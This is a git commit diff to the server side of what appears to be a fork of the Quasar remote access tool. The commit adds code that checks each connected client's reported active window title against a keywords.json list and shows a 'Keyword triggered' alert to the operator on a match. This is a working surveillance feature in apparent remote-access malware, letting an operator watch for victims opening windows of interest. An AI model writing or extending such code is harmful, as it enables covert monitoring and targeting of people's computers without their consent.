848d6ecf189287bf4e82fe9cdf42f54e17fe23cd
Ethan <ethan@genocide.fun>
2025-03-13 20:27:17 +0000

    Add files via upload

--- Quasar.Server/Messages/ClientStatusHandler.cs
+++ Quasar.Server/Messages/ClientStatusHandler.cs
@@ -2,8 +2,13 @@
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.other;
 using Quasar.Common.Networking;
+using Quasar.Server.Forms;
 using Quasar.Server.Networking;
 using System;
+using System.IO;
+using System.Linq;
+using System.Text.Json;
+using System.Windows.Forms;
 
 namespace Quasar.Server.Messages
 {
@@ -130,6 +135,28 @@ namespace Quasar.Server.Messages
         private void Execute(Client client, SetUserActiveWindowStatus message)
         {
             OnUserActiveWindowStatusUpdated(client, message.WindowTitle);
+            string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
+
+            if (File.Exists(keywordsFilePath))
+            {
+                string jsonContent = File.ReadAllText(keywordsFilePath);
+                var keywords = JsonSerializer.Deserialize<string[]>(jsonContent);
+
+                if (keywords != null)
+                {
+                    var matchedKeyword = keywords.FirstOrDefault(keyword => message.WindowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
+
+                    if (matchedKeyword != null)
+                    {
+                        FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
+                        if (frm != null)
+                        {
+                            string username = client.GetClientIdentifier(frm);
+                            FrmMain.AddNotiEvent(frm, username, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
+                        }
+                    }
+                }
+            }
         }
     }
 }
